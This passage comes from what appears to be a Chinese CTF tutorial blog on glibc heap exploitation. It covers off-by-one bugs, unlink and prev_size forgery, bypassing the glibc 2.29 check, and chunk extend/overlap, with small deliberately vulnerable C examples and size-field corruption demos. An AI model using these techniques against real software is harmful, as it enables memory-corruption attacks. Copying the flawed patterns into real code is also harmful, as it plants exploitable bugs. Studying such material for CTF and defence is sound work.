number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>16 字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 <code>pre_size</code> 域</p><p>用户申请的内存大小与 Glibc 中实际分配的内存大小之间的转换如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* pad request bytes into a usable size -- internal version */</span><span class="token comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">request2size</span><span class="token expression"><span class="token punctuation">(</span>req<span class="token punctuation">)</span>                                                      </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                           </span><span class="token punctuation">\</span>         <span class="token expression"><span class="token operator">?</span> MINSIZE                                                             </span><span class="token punctuation">\</span>         <span class="token expression"><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>MALLOC_ALIGN_MASK<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>req = 24</code> 时，<code>request2size(24) = 32</code></p><p>除去 <code>chunk</code> 头部的 16 字节，实际上用户可用 <code>chunk</code> 为 16 字节，而 <code>chunk</code> 的 <code>pre_size</code> 仅当它的前一块处于释放状态时才起作用，所以用户这时候其实还可以使用下一个 <code>chunk</code> 的 <code>prev_size</code> 字段，正好 24 个字节</p><blockquote><p>实际上 <code>ptmalloc2</code> 分配内存是以双字为基本单位</p><p>以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 <code>chunk</code> 都是 16 字节对齐的</p></blockquote><hr><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><blockquote><p>off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且<strong>只越界了一个字节</strong>，属于一种特殊的溢出漏洞</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/">堆中的 off-by-one - CTF Wiki</a></p></blockquote><p>off-by-one 最终的效果是可以将一个释放状态的 <code>small bin chunk</code> 或是 <code>unsorted bin chunk</code> 一直到被溢出 <code>chunk</code> 合并成一个大的 <code>chunk</code></p><hr><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>这种漏洞的产生往往与边界验证不严和字符串操作有关，例如：</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节</li></ul><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">my_gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">my_gets</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 for 循环的边界没有控制好，导致写入多执行了一次</p><p>执行 <code>my_gets()</code> 之前的堆：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A81.png" alt="CTF - PWN_堆相关的漏洞与利用1.png"></p><p>假设输入了 17 个字节：<code>aaaaaaaaaaaaaaaaa</code>，此时的堆：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A82.png" alt="CTF - PWN_堆相关的漏洞与利用2.png"></p><p>可以看到数据发生了溢出，有一个 <code>&#39;a&#39;</code> 覆盖到了下一个堆块的 <code>prev_size</code> 域</p><ul><li>字符串操作不合适</li></ul><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">24</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不考虑栈溢出，似乎没什么问题，可能很多人在实际的代码中也是这样写的，但是 <strong><code>strlen</code> 和 <code>strcpy</code> 的行为不一致却导致了 off-by-one 的发生</strong></p><p>原因在于，<code>strlen</code> 在计算字符串长度时不包括结束符 <code>&#39;\x00&#39;</code>，而 <code>strcpy</code> 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，因此，最后其实向 <code>chunk1</code> 中写入了 25 个字节</p><p>执行 <code>gets(buffer)</code> 之前的堆：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A83.png" alt="CTF - PWN_堆相关的漏洞与利用3.png"></p><p>执行 <code>strcpy(chunk1, buffer)</code> 之后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A84.png" alt="CTF - PWN_堆相关的漏洞与利用4.png"></p><p>可以看到 <code>next chunk</code> 的 <code>size</code> 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖（这种情况又属于 off-by-one 的一个分支：NULL byte off-by-one）</p><ul><li>当然，也不排除写入的 <code>size</code> 正好就只多了一个字节的情况</li></ul><blockquote><p>一般来说，单字节溢出被认为是难以利用的</p><p>但是因为 Linux 的堆管理机制 <code>ptmalloc2</code> 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大</p></blockquote><hr><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节为可控制任意字节</li></ol><p>通过修改大小造成块结构之间出现重叠，从而泄露或者覆盖其他块数据</p><ol start="2"><li>溢出字节为 NULL 字节</li></ol><p>在 <code>size</code> 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清除（记录前一个 <code>chunk</code> 块是否被分配），这样前一个块会被认为是 free 块</p><p>然后可以采用以下方法：</p><p>（1）使用 unlink 方法进行处理</p><p>（2）由于这时 <code>prev_size</code> 域会被启用，可以伪造 <code>prev_size</code> 造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与 <code>prev_size</code> 是否一致</p><blockquote><p>注意：</p><p>在 Glibc 2.29 以后的版本代码中已经加入针对方法（2）的 <code>check</code> ，因此传统的方法（2）失效；但是在 Glibc 2.28 及之前版本并没有该 <code>check</code>，可以继续使用</p></blockquote><p>Glibc 中对于此处的 <code>check</code> 如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* consolidate backward */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      prevsize <span class="token operator">=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>      size <span class="token operator">+=</span> prevsize<span class="token punctuation">;</span>      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* 下面两行代码在新版本 Glibc 中加入，则方法（2）无法使用，但是 Glibc 2.28 及之前版本都没有问题      if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr ("corrupted size vs. prev_size while consolidating"); */</span>      <span class="token function">unlink_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Glibc 2.29 以后的版本中， <code>check</code> 处增加了两行代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">!=</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size while consolidating"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这让我们想要控制一个真实 <code>chunk</code> 的 <code>size</code> 字段变得更加困难，所以传统的 NULL byte off-by-one 方法失效</p><p>但是，只需要满足被 unlink 的 <code>chunk</code> 和下一个 <code>chunk</code> 相连，仍然可以伪造 <code>fake_chunk</code></p><p>伪造的方式就是使用 <code>large bin</code> 遗留的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针：</p><ul><li>以 <code>fd_nextsize</code> 为 <code>fake_chunk</code> 的 <code>fd</code></li><li>以 <code>bk_nextsize</code> 为 <code>fake_chunk</code> 的 <code>bk</code></li></ul><p>这样我们可以完全控制该 <code>fake_chunk</code> 的 <code>size</code> 字段（这个过程会破坏原 <code>large bin chunk</code> 的 <code>fd</code> 指针，但是没有关系），同时还可以通过部分覆写 <code>fd_nextsize</code> 控制其 <code>fd</code>，然后在后面使用其他的 <code>chunk</code> 辅助伪造，可以通过该 <code>check</code></p><p>然后只需要通过 unlink 的检测就可以了，也就是：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">(</span>fd <span class="token operator">-></span> bk <span class="token operator">==</span> p<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>bk <span class="token operator">-></span> fd <span class="token operator">==</span> p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果 <code>large bin</code> 中仅有一个 <code>chunk</code>，那么该 <code>chunk</code> 的 <code>fd_nextsize</code> 指针和 <code>bk_nextsize</code> 指针都会指向自己</p></blockquote><ol><li><p>我们可以控制 <code>fd_nextsize</code> 指向堆上的任意地址，可以容易地使之指向一个 <code>fast bin + 0x10 - 0x18</code>，而 <code>fast bin</code> 中的 <code>fd</code> 也会指向堆上的一个地址，通过部分覆写该指针也可以使该指针指向之前的 <code>large bin + 0x10</code>，这样就可以通过 <code>fd -&gt; bk == p</code> 的检测</p></li><li><p>由于 <code>bk_nextsize</code> 我们无法修改，所以 <code>bk -&gt; fd</code> 必然在原先的 <code>large bin chunk</code> 的 <code>fd</code> 指针处（这个 <code>fd</code> 被我们破坏了），通过 <code>fast bin</code> 的链表特性可以做到修改这个指针且不影响其他的数据，再将其部分覆写就可以通过 <code>bk -&gt; fd == p</code> 的检测</p></li><li><p>然后通过 off-by-one 向低地址合并，实现 <code>chunk Overlap</code>，之后可以泄露 libc 的基地址和堆地址，然后 <code>tcache</code> 打 <code>__free_hook</code> 即可</p></li></ol><hr><h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><p>见本站 《<a href="%E3%80%90Asis%20CTF%202016%E3%80%91b00ks.md">【Asis CTF 2016】b00ks</a>》</p><hr><h1 id="Chunk-Extend-and-Overlap"><a href="#Chunk-Extend-and-Overlap" class="headerlink" title="Chunk Extend and Overlap"></a>Chunk Extend and Overlap</h1><blockquote><p><code>chunk extend</code>（堆扩展）是堆漏洞的一种常见利用手法，通过 <code>extend</code> 可以实现 <code>chunk Overlap</code>（堆重叠）的效果</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/">Chunk Extend and Overlapping - CTF Wiki</a></p></blockquote><p>这种利用方法通常需要以下条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 <code>chunk header</code> 中的数据</li></ul><p>一般来说，<code>Chunk Extend and Overlap</code> 并不能直接控制程序的执行流程，但是可以控制 <code>chunk</code> 中的内容：</p><ul><li><p>如果 <code>chunk</code> 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程</p></li><li><p>此外，<code>chunk extend</code> 通过控制 <code>size</code> 和 <code>pre_size</code> 域可以实现 <code>chunk Overlap</code>，通过 <code>Overlap</code> 可以控制 <code>chunk</code> 的 <code>fd / bk</code> 指针从而可以实现 <code>fastbin attack</code> 等利用</p></li></ul><hr><h2 id="对-inuse-的-fast-bin-进行-extend"><a href="#对-inuse-的-fast-bin-进行-extend" class="headerlink" title="对 inuse 的 fast bin 进行 extend"></a>对 inuse 的 fast bin 进行 extend</h2><blockquote><p>当我们创建两个堆块 <code>chunk1</code> 和 <code>chunk2</code> 时，通过修改 <code>chunk1</code> 的 <code>size</code> 域，使其 <code>size</code> 的大小包含 <code>chunk2</code>，那么 <code>free</code> 掉 <code>chunk1</code> 的时候，<code>chunk2</code> 也会被 <code>free</code> 掉</p><p>而当我们再次请求这两个堆块大小之和的堆块时，就会获得 <code>chunk1 + chunk2</code> 的空间，也就可以控制 <code>chunk2</code> 的内容</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x10 的 chunk</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的chunk</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>   <span class="token comment">// 修改第一个块的 size 域</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 实现 extend，控制了第二个块的内容</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们 <code>malloc</code> 两个堆块后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A85.png" alt="CTF - PWN_堆相关的漏洞与利用5.png"></p><p>然后修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0x41</code>（包括了 <code>chunk2</code> 的大小）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A86.png" alt="CTF - PWN_堆相关的漏洞与利用6.png"></p><p>可以看到 <code>free</code> 掉 <code>chunk1</code> 后，<code>chunk2</code> 也被 <code>free</code> 掉了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A87.png" alt="CTF - PWN_堆相关的漏洞与利用7.png"></p><p>此时如果我们再通过 <code>malloc(0x30)</code> 分配堆块，就会得到 <code>chunk1 + chunk2</code> 的块，此时就可以直接控制 <code>chunk2</code> 中的内容</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A88.png" alt="CTF - PWN_堆相关的漏洞与利用8.png"></p><p>这种状态就称为 <code>Overlap chunk</code></p><hr><h2 id="对-inuse-的-small-bin-进行-extend"><a href="#对-inuse-的-small-bin-进行-extend" class="headerlink" title="对 inuse 的 small bin 进行 extend"></a>对 inuse 的 small bin 进行 extend</h2><blockquote><p>当 <code>free</code> 掉的 <code>chunk size &gt;= 144</code>（0x90）字节时，会被置于 <code>unsorted bin</code> 中，这次以 <code>malloc(0x80)</code> 来举例</p><p>与前面的 <code>fast bin</code> 不同的是，这种情况下还需要再 <code>malloc</code> 一块空间用来防止 <code>unsorted bin</code> 与 <code>top chunk</code> 合并</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x80 的 chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的 chunk2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 防止与 top chunk 合并</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们 <code>malloc</code> 三个堆块后（<code>chunk3</code> 用来防止 <code>chunk1</code> 被篡改并 <code>free</code> 后与 <code>top chunk</code> 合并）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A89.png" alt="CTF - PWN_堆相关的漏洞与利用9.png"></p><p>然后修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0xb1</code>（包括了 <code>chunk2</code> 的大小）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A810.png" alt="CTF - PWN_堆相关的漏洞与利用10.png"></p><p>可以看到 <code>free</code> 掉 <code>chunk1</code> 后，<code>chunk2</code> 也被 <code>free</code> 掉了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A811.png" alt="CTF - PWN_堆相关的漏洞与利用11.png"></p><p>此时 <code>chunk1</code> 和 <code>chunk2</code> 被一起置入 <code>unsorted bin</code></p><p>此时如果我们再通过 <code>malloc(0xa0)</code> 分配堆块，就会得到 <code>chunk1 + chunk2</code> 的块，此时就可以直接控制 <code>chunk2</code> 中的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A812.png" alt="CTF - PWN_堆相关的漏洞与利用12.png"></p><hr><h2 id="对-free-的-small-bin-进行-extend"><a href="#对-free-的-small-bin-进行-extend" class="headerlink" title="对 free 的 small bin 进行 extend"></a>对 free 的 small bin 进行 extend</h2><blockquote><p>在，先释放 <code>chunk1</code>，然后再修改处于 <code>unsorted bin</code> 中的 <code>chunk1</code> 的 <code>size</code> 域，会使得 chunk2 也被置于 <code>unsorted bin</code> 中</p><p>当我们再次请求这两个堆块大小之和的堆块时，就会获得 <code>chunk1 + chunk2</code> 的空间，也就可以控制 <code>chunk2</code> 的内容</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x80 的 chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的 chunk2</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 首先进行释放，使得 chunk1 进入 unsorted bin</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配两个堆块后，直接 <code>free</code> 掉 <code>chunk1</code> 使其被置于 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A813.png" alt="CTF - PWN_堆相关的漏洞与利用13.png"></p><p>此时修改 <code>unsorted bin</code> 的 <code>size</code> 域为 <code>0xb1</code>（包括了 <code>chunk2</code> 的大小），发现 <code>chunk2</code> 也被置于 <code>unsorted bin</code> 中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A814.png" alt="CTF - PWN_堆相关的漏洞与利用14.png"></p><p>然后再 <code>malloc(0xa0)</code> 的大小就可以得到 <code>chunk1 + chunk2</code> 的堆块，从而控制了 <code>chunk2</code> 的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A815.png" alt="CTF - PWN_堆相关的漏洞与利用15.png"></p><hr><h2 id="通过-extend-后向-Overlap"><a href="#通过-extend-后向-Overlap" class="headerlink" title="通过 extend 后向 Overlap"></a>通过 extend 后向 Overlap</h2><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token 